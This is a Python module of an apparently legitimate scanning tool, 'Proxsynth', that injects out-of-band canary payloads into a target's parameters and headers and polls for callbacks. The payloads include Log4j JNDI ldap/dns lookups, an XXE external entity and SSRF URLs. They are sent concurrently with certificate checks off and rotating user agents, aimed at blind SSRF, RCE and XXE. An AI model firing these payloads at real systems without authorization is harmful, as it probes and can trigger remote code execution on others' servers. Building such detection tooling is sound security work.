"""
Proxsynth - Autonomous Out-of-Band (OAST) Canary Sprayer
Automatically discovers target parameters (query, form body, headers) and sprays
multi-protocol canary tokens (HTTP, DNS, LDAP/JNDI, XXE) across endpoints.
Correlates incoming out-of-band interactions to deterministically detect
Blind SSRF, Blind RCE, XXE, and Log4j with zero manual effort.
"""

import re
import json
import asyncio
import urllib.parse
from typing import Dict, Any, List, Optional
import httpx

from backend.oast_engine import generate_oast_token, poll_oast_events, get_base_callback_url
from backend.user_agents import apply_rotating_user_agent
from backend.forward_proxy import _dispatch_log


CANARY_HEADER_CANDIDATES = [
    "X-Forwarded-For",
    "X-Real-IP",
    "Referer",
    "X-Api-Version",
    "X-Client-IP",
    "CF-Connecting-IP"
]


def _build_canary_payloads(token: str, vuln_type: str, callback_url: str) -> List[str]:
    """Synthesizes targeted exploit vector payloads embedding the OAST callback token."""
    vuln_clean = vuln_type.lower().strip()
    payloads = []

    # Parse hostname for DNS / LDAP listeners
    parsed_cb = urllib.parse.urlparse(callback_url)
    cb_host = parsed_cb.hostname or "127.0.0.1"

    if vuln_clean in ["ssrf", "http", "all"]:
        payloads.append(f"{callback_url.rstrip('/')}/oast/{token}")
        payloads.append(f"http://{token}.oast.proxsynth.local/callback")

    if vuln_clean in ["dns", "all"]:
        payloads.append(f"{token}.oast.proxsynth.local")
        payloads.append(f"http://{token}.oast.proxsynth.local")

    if vuln_clean in ["jndi", "log4j", "all"]:
        # LDAP port 1390 and DNS port 5354 listeners
        payloads.append(f"${{jndi:ldap://{cb_host}:1390/{token}}}")
        payloads.append(f"${{jndi:dns://{cb_host}:5354/{token}}}")

    if vuln_clean in ["xxe", "all"]:
        payloads.append(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{token}.oast.proxsynth.local/xxe"> %xxe;]><root>test</root>')

    return payloads or [f"{callback_url.rstrip('/')}/oast/{token}"]


async def spray_oast_canaries(
    target_url: str,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    body: Optional[str] = "",
    target_params: Optional[List[str]] = None,
    vuln_types: Optional[List[str]] = None,
    project: str = "default",
    agent_id: str = "primary_agent",
    upstream_proxy: Optional[str] = None
) -> Dict[str, Any]:
    """
    Automates multi-parameter OAST canary spraying across target endpoints.
    """
    proj = (project or "default").strip().lower()
    headers = dict(headers or {})
    apply_rotating_user_agent(headers)
    method = method.upper().strip()
    vuln_types = vuln_types or ["ssrf", "dns", "log4j"]
    base_cb_url = get_base_callback_url()

    # 1. Discover injectable parameters
    parsed_url = urllib.parse.urlparse(target_url)
    query_dict = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
    
    discovered_params: List[str] = list(query_dict.keys())
    
    # Check body parameters
    body_dict = {}
    if body and body.strip():
        try:
            body_dict = json.loads(body)
            if isinstance(body_dict, dict):
                discovered_params.extend(list(body_dict.keys()))
        except Exception:
            body_form = urllib.parse.parse_qs(body, keep_blank_values=True)
            discovered_params.extend(list(body_form.keys()))

    if target_params:
        target_param_list = [p.strip() for p in target_params if p.strip()]
    else:
        target_param_list = list(set(discovered_params))
        # If no params found, add a canary query parameter and check high-impact headers
        if not target_param_list:
            target_param_list = ["test_canary"]

    canary_inventory: List[Dict[str, Any]] = []
    tokens_generated: List[str] = []

    proxy_kwargs = {}
    if upstream_proxy and upstream_proxy.strip():
        proxy_kwargs["proxy"] = upstream_proxy.strip()
    else:
        proxy_kwargs["proxy"] = None
        proxy_kwargs["trust_env"] = False

    limits = httpx.Limits(max_keepalive_connections=10, max_connections=20, keepalive_expiry=30.0)

    # 2. Generate canaries and dispatch requests concurrently
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=12.0, limits=limits, **proxy_kwargs) as client:
        for param in target_param_list:
            for v_type in vuln_types:
                # Generate unique OAST token for this exact (param, vuln_type) pair
                token_obj = generate_oast_token(
                    project=proj,
                    description=f"Canary for param '{param}' [{v_type.upper()}] on {target_url}",
                    vuln_type=v_type.upper()
                )
                token = token_obj["token"]
                tokens_generated.append(token)
                payloads = _build_canary_payloads(token, v_type, base_cb_url)

                for p_load in payloads:
                    req_headers = dict(headers)
                    req_url = target_url
                    req_body = body

                    # Inject into query parameter
                    if param in query_dict or method == "GET":
                        new_qs = dict(query_dict)
                        new_qs[param] = [p_load]
                        new_query_str = urllib.parse.urlencode(new_qs, doseq=True)
                        req_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query_str))
                    
                    # Inject into JSON body if applicable
                    elif body_dict and isinstance(body_dict, dict) and param in body_dict:
                        new_body_dict = dict(body_dict)
                        new_body_dict[param] = p_load
                        req_body = json.dumps(new_body_dict)
                    
                    # Inject into headers if candidate header
                    if param in CANARY_HEADER_CANDIDATES:
                        req_headers[param] = p_load

                    inventory_item = {
                        "param": param,
                        "token": token,
                        "vuln_type": v_type.upper(),
                        "payload": p_load,
                        "injected_url": req_url
                    }
                    canary_inventory.append(inventory_item)

                    # Dispatch canary request
                    try:
                        content_bytes = req_body.encode("utf-8") if req_body else None
                        resp = await client.request(
                            method=method,
                            url=req_url,
                            headers=req_headers,
                            content=content_bytes
                        )

                        # Correlate outbound canary spray to HttpLog
                        try:
                            parsed_injected = urllib.parse.urlparse(req_url)
                            await _dispatch_log({
                                "project": proj,
                                "agent_id": agent_id,
                                "source": "OAST_SPRAYER",
                                "method": method,
                                "url": req_url,
                                "host": parsed_injected.netloc,
                                "path": parsed_injected.path or "/",
                                "status_code": resp.status_code,
                                "duration_ms": 100,
                                "request_headers": req_headers,
                                "request_body": req_body or "",
                                "response_headers": dict(resp.headers),
                                "response_body": resp.text[:500] if resp.text else "",
                                "reasoning": f"[OAST Canary Spray] Token: {token} | Param: {param} | Type: {v_type.upper()}",
                                "flag_status": "POTENTIAL",
                                "finding_title": "",
                                "finding_severity": "INFO"
                            })
                        except Exception:
                            pass
                    except Exception:
                        pass

    # 3. Brief wait and poll for immediate hits
    await asyncio.sleep(0.5)
    confirmed_hits = []
    for tok in set(tokens_generated):
        events = await poll_oast_events(token=tok, project=proj, timeout_seconds=0.2)
        if events:
            for ev in events:
                confirmed_hits.append({
                    "token": tok,
                    "event": ev,
                    "matched_canary": next((c for c in canary_inventory if c["token"] == tok), None)
                })

    return {
        "status": "COMPLETED",
        "target_url": target_url,
        "method": method,
        "parameters_tested": target_param_list,
        "vuln_types": [v.upper() for v in vuln_types],
        "total_canaries_sprayed": len(canary_inventory),
        "canary_inventory": canary_inventory,
        "immediate_hits_detected": confirmed_hits,
        "confirmed_vulnerabilities_count": len(confirmed_hits)
    }
